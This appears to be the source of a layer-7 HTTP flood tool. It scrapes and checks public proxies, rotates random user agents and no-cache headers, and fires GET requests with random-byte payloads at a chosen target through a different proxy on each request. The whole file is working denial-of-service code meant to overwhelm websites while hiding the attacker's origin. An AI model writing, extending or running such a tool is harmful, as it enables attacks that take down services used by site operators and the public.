# Import modules
import requests
import random
import urllib
import cfscrape
import time
import subprocess
import string
import os
import tools.randomData as randomData
from colorama import Fore


def cls():
    os.system('clear')




# now, to clear the screen
cls()

subprocess.call("python3 proxyscrapermaster/proxyScraper.py --p http -o tools/L7/proxies.txt -v", shell=True)

subprocess.call("python3 proxyscrapermaster/proxyScraper.py --p https -o tools/L7/proxies_https.txt -v", shell=True)


subprocess.call("python3 proxyscrapermaster/proxyChecker.py -t 1 -s google.com -l tools/L7/proxies.txt -v", shell=True)

subprocess.call("python3 proxyscrapermaster/proxyChecker.py -t 1 -s google.com -l tools/L7/proxies_https.txt -v", shell=True)

time.sleep(5)

# now, to clear the screen
cls()

session = requests.Session()
proxy = set()
proxyhttps = set()



with open("tools/L7/proxies.txt", "r") as f:
    file_lines1 = f.readlines()
    for line1 in file_lines1:
        proxy.add(line1.strip())

with open("tools/L7/proxies_https.txt", "r") as ss:
    file_lines2 = ss.readlines()
    for line2 in file_lines2:
        proxyhttps.add(line2.strip())







# Load user agents
user_agents = []
for _ in range(30):
    user_agents.append(randomData.random_useragent())

# Headers
headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
    "User-agent": random.choice(user_agents),
}

def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def flood(target):

    #payload = 'username='+get_random_string(20)+'&password='+get_random_string(20)+'&type=m3u_plus&output=mpegts'
    payload = str(random._urandom(random.randint(10, 150)))
    session.proxies = {'http': 'http://'+random.choice(list(proxy)),'https': 'https://'+random.choice(list(proxyhttps)),}


    try:

        r = session.get(target, proxies=session.proxies, params=payload,  headers=headers, timeout=4)
    except requests.exceptions.ConnectTimeout:
        print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
    except Exception as e:
        print(
            f"{Fore.MAGENTA}Error while sending GET request\n{Fore.MAGENTA}{e}{Fore.RESET}"
        )
    else:
        print(
            f"{Fore.GREEN}[{r.status_code}] {Fore.YELLOW}Request sent! Payload size: {len(payload)}.{Fore.RESET}"
        )
